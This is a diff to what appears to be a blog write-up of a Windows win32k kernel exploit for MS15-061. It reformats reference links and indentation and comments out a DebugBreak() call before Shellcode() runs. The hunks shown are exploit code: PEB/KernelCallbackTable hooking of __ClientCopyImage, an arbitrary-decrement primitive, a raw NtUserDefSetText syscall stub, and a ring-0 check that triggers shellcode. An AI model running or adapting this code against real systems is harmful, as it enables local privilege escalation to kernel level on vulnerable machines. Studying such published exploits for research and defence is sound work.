@@ -16,9 +16,9 @@ steps :
 * Repeat this process until bServerSideWindowProc is established.
 
 Referenaces
-* https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf
-* http://www.mista.nu/research/mandt-win32k-slides.pdf
-* https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/
+* [nccgroup](https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf)
+* [mista](http://www.mista.nu/research/mandt-win32k-slides.pdf)
+* [mwrinfosecurity](https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/)
 
 
 {% highlight cpp %}
@@ -70,11 +70,10 @@ void *Get__Win32ClientInfo()
     void *address = NULL;
     __asm
     {
-		mov     eax,dword ptr fs:[00000018h] // eax=TEB
+	mov     eax,dword ptr fs:[00000018h] // eax=TEB
         mov     eax,dword ptr [eax+0x6cc] // Win32ClientInfo
-		mov	  address,eax;
+	mov	  address,eax;
     }
-
     return address;
 }
 
@@ -131,7 +130,6 @@ HWND GetKernelHandle(HWND hwnd)
 
 VOID ArbDecByOne(DWORD addr)
 {
-
     *(DWORD *)(originalCLS + 0x58) = addr - 0x4;
 }
 
@@ -172,9 +170,9 @@ __declspec(naked) BOOL NTAPI NtUserDefSetText(
     __asm
     {
         mov     eax, 116Dh
-		mov     edx, 7FFE0300h	
-		call    dword ptr [edx]
-		retn    8
+	mov     edx, 7FFE0300h	
+	call    dword ptr [edx]
+	retn    8
     }
 }
 
@@ -213,8 +211,8 @@ LRESULT CALLBACK WndProc2(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     WORD um = 0;
     __asm
     {
-		mov ax, cs
-		mov um, ax
+	mov ax, cs
+	mov um, ax
     }
     if (um == 0x1b)
     {
@@ -223,7 +221,7 @@ LRESULT CALLBACK WndProc2(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     else
     {
         success = TRUE;
-        DebugBreak();
+       // DebugBreak();
 
         Shellcode();
     }
@@ -312,12 +310,12 @@ void *Get__ClientCopyImageAddressInPEB()
     void *address = NULL;
     __asm
     {
-		mov edx , 0xD8; // 0x36 *4 ->  API index *4  number  for  __ClientCopyImage
-		mov     eax,dword ptr fs:[00000018h] // eax=TEB
+	mov edx , 0xD8; // 0x36 *4 ->  API index *4  number  for  __ClientCopyImage
+	mov     eax,dword ptr fs:[00000018h] // eax=TEB
         mov     eax,dword ptr [eax+30h] // EAX=PEB
         mov     eax,dword ptr [eax+2Ch] // EAX=KernelCallbackTable
-		add	  eax,edx
-		mov	  address,eax;
+	add	  eax,edx
+	mov	  address,eax;
 		//  int 3
 
     }
